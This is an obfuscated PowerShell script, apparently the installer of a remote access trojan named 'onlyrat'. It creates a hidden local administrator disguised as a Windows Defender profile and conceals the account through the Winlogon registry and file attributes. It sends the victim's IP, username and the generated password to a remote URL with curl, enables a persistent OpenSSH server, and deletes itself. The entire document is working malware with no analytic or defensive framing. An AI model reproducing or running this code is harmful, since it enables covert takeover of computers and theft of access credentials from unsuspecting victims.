function mfRCoqywZDeQlL($mNHDTfYFzXUeZn){
    return -join ((65..90) + (97..122)|Get-Random -Count $mNHDTfYFzXUeZn|%{[char]$_})
}

# Create local admin for the rat
function hqTnJbKVSsMrZgXw {
    [CmdletBinding()]
    param (
        [string] $vWrPkQSpYZtOb,
        [securestring] $WSUcYXCfOldphPx
    )    
    begin {
    }    
    process {
        New-LocalUser "$vWrPkQSpYZtOb" -Password $WSUcYXCfOldphPx -FullName "$vWrPkQSpYZtOb" -Description "Windows Defender Profile" # can remove description parameter if want
        # Write-Verbose "$vWrPkQSpYZtOb local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$vWrPkQSpYZtOb"
        # Write-Verbose "$vWrPkQSpYZtOb added to the local administrator group"
    }    
    end {
    }
}
# create admin user
$NzSqmkZnFQcBf = "onlyrat"
$OIRXhsDHFU = mfRCoqywZDeQlL(Get-Random -Minimum 6 -Maximum 19)
Remove-LocalUser -Name "$NzSqmkZnFQcBf"
$blZqsekcOWhwU = (ConvertTo-SecureString $OIRXhsDHFU -AsPlainText -Force)
hqTnJbKVSsMrZgXw -vWrPkQSpYZtOb $NzSqmkZnFQcBf -WSUcYXCfOldphPx $blZqsekcOWhwU
# registry
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name SpecialAccounts -Force
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts" -Name UserList -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $NzSqmkZnFQcBf -Value 0 -Type DWORD -Force

# Variables
# save current directory
$fXmtFxsAMdGw = Get-Location|%{$_.Path}
$QLxOhYDbSkv = Get-Content .\QqXjYbeWZoUhT.txt
$rtsRfiZBxpGP = "$env:username.rat"
$LcghRQwiJbdINVyFY = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress
#generate controller file
Add-Content -Path "$fXmtFxsAMdGw\meuqSoQyrCUvhGjpV.cmd" -Value "@echo off"
# generate config file
Add-Content -Path $rtsRfiZBxpGP -Value $LcghRQwiJbdINVyFY   #ip
Add-Content -Path $rtsRfiZBxpGP -Value $OIRXhsDHFU          #pass
Add-Content -Path $rtsRfiZBxpGP -Value $env:USERNAME        #username
Add-Content -Path $rtsRfiZBxpGP -Value $env:temp            #temp dir
Add-Content -Path $rtsRfiZBxpGP -Value $fXmtFxsAMdGw        #startup dir
# Send Initial reconnaissance
$form_data = @{}
$form_data["content"] = $env:USERNAME
$form_data["file"] = Get-Item -Path $rtsRfiZBxpGP
curl.exe -F "content=$env:USERNAME" -F "file=@$rtsRfiZBxpGP" $QLxOhYDbSkv

# cleanup your credentials and reconnaissance files
Remove-Item .\QqXjYbeWZoUhT.txt -Force
Remove-Item .\$rtsRfiZBxpGP -Force

# Install the OpenSSH Server feature
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
# Start the OpenSSH Server service
Start-Service sshd
# Set the service to start automatically on boot
Set-Service -Name sshd -StartupType Automatic

# move to users to hide our onlyrat local admin
cd C:\Users
attrib +h +s +r "onlyrat"

# navigate to the saved directory and self delete
cd $fXmtFxsAMdGw
del OVlqumatcNr.ps1